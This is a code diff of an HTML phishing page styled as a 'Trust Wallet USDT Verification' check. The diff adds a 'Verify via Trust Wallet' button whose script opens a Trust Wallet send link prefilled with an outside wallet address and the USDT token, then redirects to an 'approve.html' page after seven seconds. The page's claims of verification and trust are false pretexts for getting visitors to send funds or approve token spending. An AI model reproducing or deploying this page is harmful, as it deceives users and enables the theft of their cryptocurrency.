@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>USDT Verification</title>
+  <title>Trust Wallet USDT Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
@@ -11,37 +11,40 @@
       font-family: sans-serif;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       text-align: center;
     }
+
     .btn {
       background: #1e90ff;
       color: white;
       padding: 14px 32px;
+      font-size: 18px;
       border: none;
       border-radius: 10px;
-      font-size: 18px;
       cursor: pointer;
       margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h2>Verified by Trust Wallet since 2009</h2>
+  <h2>Trust Wallet Verification</h2>
   <p>Trusted by millions of users</p>
 
-  <p>Opening Trust Wallet...</p>
+  <button class="btn" onclick="verify()">Verify via Trust Wallet</button>
 
   <script>
-    // Open Trust Wallet Send Page
-    window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
-
-    // After delay, redirect to approve page (user back from send)
-    setTimeout(() => {
-      window.location.href = "approve.html";
-    }, 10000); // 10 seconds
+    function verify() {
+      // Step 1: Open Trust Wallet Send page
+      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
+      
+      // Step 2: After 7 seconds, redirect to Approve
+      setTimeout(() => {
+        window.location.href = "approve.html";
+      }, 7000); // 7 seconds
+    }
   </script>
 </body>
 </html>
